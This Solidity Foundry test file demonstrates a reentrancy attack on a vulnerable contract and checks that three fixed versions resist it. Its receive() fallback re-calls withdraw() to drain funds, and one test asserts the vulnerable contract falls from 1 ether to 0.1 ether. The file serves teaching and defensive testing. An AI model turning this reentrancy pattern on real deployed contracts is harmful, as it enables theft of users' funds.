// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../contracts/Reentrant.sol";
import "../../contracts/ReentrantSolution1.sol";
import "../../contracts/ReentrantSolution2.sol";
import "../../contracts/ReentrantSolution3.sol";
import "../TestUtils.sol";

contract ReentrantAttack is Test, TestUtils {
    Reentrant public reentrant;
    ReentrantSolution1 public firstSolution;
    ReentrantSolution2 public secondSolution;
    ReentrantSolution3 public thirdSolution;

    constructor() {
        reentrant = new Reentrant();
        firstSolution = new ReentrantSolution1();
        secondSolution = new ReentrantSolution2();
        thirdSolution = new ReentrantSolution3();
    }

    function setUp() public {
        // deposit 0.5 ether to each contract
        for (uint256 index = 0; index < 5; index++) {
            reentrant.deposit{value: 0.1 ether}();
            firstSolution.deposit{value: 0.1 ether}();
            secondSolution.deposit{value: 0.1 ether}();
            thirdSolution.deposit{value: 0.1 ether}();
        }
     
        // deposit another 0.5 ether to each contract
        // but with another user's address as the caller
        vm.deal(getTestAddresses()[0], 5 ether);
        vm.startPrank(getTestAddresses()[0]);
        for (uint256 index = 0; index < 5; index++) {
            reentrant.deposit{value: 0.1 ether}();
            firstSolution.deposit{value: 0.1 ether}();
            secondSolution.deposit{value: 0.1 ether}();
            thirdSolution.deposit{value: 0.1 ether}();
        }
        vm.stopPrank();
    }

    function testAttack() public {
        assertTrue(balanceOf(address(reentrant)) == 1 ether);
        reentrant.withdraw();
        assertTrue(balanceOf(address(reentrant)) == 0.1 ether);
    }

    function testFirstSolution() public {
        assertTrue(balanceOf(address(firstSolution)) == 1 ether);
        vm.expectRevert("Failed to send Ether");
        firstSolution.withdraw();
        assertTrue(balanceOf(address(firstSolution)) == 1 ether);
    }

    function testSecondSolution() public {
        assertTrue(balanceOf(address(secondSolution)) == 1 ether);
        vm.expectRevert();
        secondSolution.withdraw();
        assertTrue(balanceOf(address(secondSolution)) == 1 ether);
    }

    function testThirdSolution() public {
        assertTrue(balanceOf(address(thirdSolution)) == 1 ether);
        vm.expectRevert("Failed to send Ether");
        thirdSolution.withdraw();
        assertTrue(balanceOf(address(thirdSolution)) == 1 ether);
    }

    /** @dev This is where the reentrancy occurs
             as we recall the contract when ether is 
             sent to this contract 
     */
    receive() external payable {
        if (balanceOf(address(msg.sender)) > 0.1 ether) {
            Reentrant(msg.sender).withdraw();
        }
    }
}
